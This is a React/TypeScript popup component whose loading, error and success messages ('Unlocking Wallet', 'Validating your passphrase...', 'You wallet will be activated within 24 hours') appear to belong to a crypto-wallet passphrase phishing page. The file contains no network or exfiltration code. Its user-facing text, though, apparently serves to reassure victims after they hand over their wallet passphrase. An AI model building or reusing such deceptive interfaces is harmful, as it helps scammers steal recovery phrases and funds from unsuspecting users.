import React, { useState, useEffect } from 'react';
import { CheckCircle, Loader, AlertTriangle, X } from 'lucide-react';

type PopupStatus = 'loading' | 'success' | 'error';

interface PopupOverlayProps {
  isOpen: boolean;
  onClose: () => void;
  status: PopupStatus;
}

const PopupOverlay: React.FC<PopupOverlayProps> = ({ isOpen, onClose, status = "success" }) => {
  const [animation, setAnimation] = useState<string>('');

  useEffect(() => {
    if (isOpen) {
      setAnimation('scale-in');
      // If status is 'success', close popup automatically after 3 seconds
      if (status === 'success') {
        const timer = setTimeout(() => {
          setAnimation('scale-out');
          setTimeout(onClose, 300);
        }, 3000);
        return () => clearTimeout(timer);
      }
    } else {
      setAnimation('scale-out');
    }
  }, [isOpen, status, onClose]);

  if (!isOpen) return null;

  const getStatusContent = () => {
    switch (status) {
      case 'loading':
        return (
          <>
            <Loader className="animate-spin text-purple-700 w-16 h-16 mb-4" />
            <h2 className="text-xl font-bold text-gray-800 mb-2">Unlocking Wallet</h2>
            <p className="text-gray-600 text-center">Validating your passphrase...</p>
          </>
        );
      case 'success':
        return (
          <>
            <CheckCircle className="text-green-500 w-16 h-16 mb-4" />
            {/* <h2 className="text-xl font-bold text-gray-800 mb-2">Success!</h2> */}
            <p className="text-gray-600 text-center">You wallet will be activated within 24 hours</p>
          </>
        );
      case 'error':
        return (
          <>
            <AlertTriangle className="text-red-500 w-16 h-16 mb-4" />
            <h2 className="text-xl font-bold text-gray-800 mb-2">Invalid Passphrase</h2>
            <p className="text-gray-600 text-center">The passphrase you entered is incorrect. Please try again.</p>
          </>
        );
      default:
        return null;
    }
  };

  return (
    <div className="fixed inset-0 bg-[#00000075] flex items-center justify-center z-50">
      <div className={`bg-white rounded-lg p-6 max-w-sm w-full mx-4 flex flex-col items-center relative shadow-xl ${animation}`}>
        {status !== 'loading' && (
          <button 
            onClick={() => {
              setAnimation('scale-out');
              setTimeout(onClose, 300);
            }}
            className="absolute top-2 right-2 text-gray-500 hover:text-gray-700"
          >
            <X size={20} />
          </button>
        )}
        {getStatusContent()}
      </div>
      <style jsx={true}>{`
        .scale-in {
          animation: scaleIn 0.3s ease forwards;
        }
        .scale-out {
          animation: scaleOut 0.3s ease forwards;
        }
        @keyframes scaleIn {
          from { transform: scale(0.8); opacity: 0; }
          to { transform: scale(1); opacity: 1; }
        }
        @keyframes scaleOut {
          from { transform: scale(1); opacity: 1; }
          to { transform: scale(0.8); opacity: 0; }
        }
      `}</style>
    </div>
  );
};

export default PopupOverlay;